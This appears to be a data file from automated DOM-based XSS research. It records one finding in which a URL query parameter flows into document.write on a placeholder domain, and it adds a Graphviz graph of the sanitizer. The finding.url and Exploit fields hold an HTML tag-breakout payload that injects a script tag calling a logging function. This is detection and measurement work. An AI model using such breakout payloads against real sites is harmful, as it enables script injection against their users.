@@ -1,0 +1,70 @@
+// Finding: d9eedf8f-a5da-446b-9f1c-cfa070940439
+// Finding.url: https://onlinedegrees.example206.com/programs/accelerated-bsn-online-v1?schoolsrc=44161&mrasn=712754.885073.BIgcJ3tc"></iframe></style></script></object></embed></textarea><script>taintfoxLog('3c71f056200b4f7ea2b16117d83167ae')</script><!--/*
+// Finding.parentloc: https://onlinedegrees.example206.com/programs/accelerated-bsn-online-v1?schoolsrc=44161&mrasn=712754.885073.BIgcJ3tc"></iframe></style></script></object></embed></textarea><script>taintfoxLog('3c71f056200b4f7ea2b16117d83167ae')</script><!--/*
+// Finding.domain: onlinedegrees.example206.com
+// Finding.base_domain: example206.com
+// Finding.source: location.search
+// Finding.sink: document.write
+// Sanitizer.score: 1
+// Sanitizer.name: encQString
+// Sanitizer.location: https://tracking.example207.com/ - <anonymous>:7:110
+// Finding.begin: 208
+// Finding.end: 257
+// Finding.original_uuid: d2b559dc-24ae-42a6-ad73-b325d11faed6
+// Finding.TwentyFiveMillionFlowsId: 615525690
+// Finding.script: https://tracking.example207.com/
+// Finding.line: 7
+// Exploit.uuid: 3c71f056-200b-4f7e-a2b1-6117d83167ae
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: src
+// Exploit.quote_type: "
+// Exploit.tag: script
+// Exploit.break_out: schoolsrc=44161&mrasn=712754.885073.BIgcJ3tc"></iframe></style></script></object></embed></textarea><script>
+// Exploit.break_in: </script><!--/*
+// Exploit.payload: schoolsrc=44161&mrasn=712754.885073.BIgcJ3tc"></iframe></style></script></object></embed></textarea><script>taintfoxLog(1)</script><!--/*
+// Exploit.begin_taint_url: 70
+// Exploit.end_taint_url: 114
+// Exploit.replace_begin_url: 70
+// Exploit.replace_end_url: 114
+// Exploit.replace_begin_param: 86
+// Exploit.replace_end_param: 130
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -1350129772
+// DepGraph.sanitizer_hash: -1350129772
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="str_replace_once"];
+n2 [shape=box, label="Lit: '"];
+n3 [shape=box, label="Lit: ''"];
+n4 [shape=box, label="Var: x"];
+n5 [shape=box, label="Var: x"];
+n6 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n5 -> n1;
+n6 -> n5;
+}
